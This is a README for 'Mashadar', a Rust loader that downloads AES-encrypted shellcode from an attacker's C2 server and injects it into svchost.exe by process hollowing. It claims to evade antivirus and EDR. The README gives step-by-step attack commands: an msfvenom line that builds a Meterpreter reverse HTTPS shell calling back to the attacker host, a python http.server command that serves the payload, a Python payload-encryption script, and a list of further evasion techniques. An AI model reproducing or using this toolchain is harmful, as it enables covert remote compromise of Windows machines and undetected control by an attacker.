# 🚀 Mashadar: Remote Shellcode Loader with Process Hollowing

**Stealthy, in-memory process hollowing framework for Windows, dynamically fetching encrypted shellcode over HTTP.**\
This project allows you to **remotely load and execute shellcode** inside another process without ever touching disk.

---

## 📌 Features

✔️ **Process Hollowing** → Injects shellcode into `svchost.exe`, executing entirely in-memory.\
✔️ **Remote Payload Retrieval** → Downloads encrypted `payload.bin` from a C2 server.\
✔️ **No Disk Artifacts** → The payload is never written to disk, reducing forensic risk.\
✔️ **AES Encryption** → Encrypted payloads evade network-based detection.\
✔️ **Bypasses AV/EDR** → Uses indirect syscalls and kernel stealth to evade detection.

# 🔧 Setup & Compilation

## 🔹 Dependencies

Ensure you have **Rust** installed on your system. You can install it via:
[https://www.rust-lang.org/tools/install](https://www.rust-lang.org/tools/install)

## 🔹 Set the Encryption Password

Modify `src/encryption.rs`, setting your own encryption key and nonce:

```rust
let key: [u8; 16] = *b"mysecretkey12345";
let nonce: [u8; 16] = *b"random_iv_nonce_"; // Must be exactly 16 bytes
```

## 🔹 Modify the C2 Server Address

Edit `src/c2.rs`, replacing `"192.168.1.100:8080"` with your attacker's IP:

```rust
let server_ip = "192.168.1.100:8080";
```

## 🔹 Compile Mashadar

```sh
cargo build --release
```

✅ **Output:** `target/release/mashadar.exe`

---

# 🚀 Running Mashadar

## 🔹 Start the C2 Server

On your **attacker machine**, place `payload.bin` in `/path/to/shellcode` and start a Python webserver:

```sh
cd /path/to/shellcode
python3 -m http.server 8080
```

✅ **C2 Server Running on Port 8080**

## 🔹 Run Mashadar on the Target Machine

Transfer `mashadar.exe` to the **target Windows machine** and execute:

```sh
mashadar.exe
```

## 🔹 Expected Behavior

1. **Mashadar connects to ****`http://192.168.1.100:8080/payload.bin`**
2. **Downloads & decrypts the shellcode (AES-128 CTR)**
3. **Injects it into ****`svchost.exe`**** via process hollowing**
4. **Executes shellcode in-memory (e.g., Meterpreter, Cobalt Strike, etc.)**

---

# ⚠️ Handling the Payload (Step-By-Step)

## 🔹 Generating a Reverse Shell for Windows

To create a **Windows Meterpreter reverse shell**, run:

```sh
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f raw -o payload.bin
```

✅ This generates `payload.bin`, which is a **Windows-compatible shellcode payload**.

## 🔹 Encrypting the Payload Before Uploading

To **encrypt** `payload.bin`, use Python:

```python
from Crypto.Cipher import AES
from Crypto.Util import Counter

key = b"mysecretkey12345"
nonce = b"random_iv_nonce_"

with open("payload.bin", "rb") as f:
    shellcode = f.read()

ctr = Counter.new(128, initial_value=int.from_bytes(nonce, "big"))
cipher = AES.new(key, AES.MODE_CTR, counter=ctr)

encrypted_shellcode = cipher.encrypt(shellcode)

with open("payload_encrypted.bin", "wb") as f:
    f.write(encrypted_shellcode)
```

✅ **Upload ****`payload_encrypted.bin`**** to your C2 server instead of ****`payload.bin`****.**\
✅ **Mashadar will decrypt it before execution.**

# 🔥 Why This is Stealthy

✔️ **No files written to disk** → Shellcode exists only in-memory.\
✔️ **C2 dynamically delivers payloads** → Easily swap payloads without recompiling.\
✔️ **Indirect syscalls bypass AV/EDR hooks** → No `CreateRemoteThread` detection.\
✔️ **AES encryption protects against network-based detection**.

---

# 🚀 Next Steps (More Stealth)

🔹 **Use HTTPS instead of HTTP** to avoid plaintext traffic detection.\
🔹 **Implement DNS Tunneling** for C2 traffic evasion.\
🔹 **Deploy via Reflective DLL Injection instead of Hollowing.**\
🔹 **Obfuscate API calls to defeat heuristic detection.**
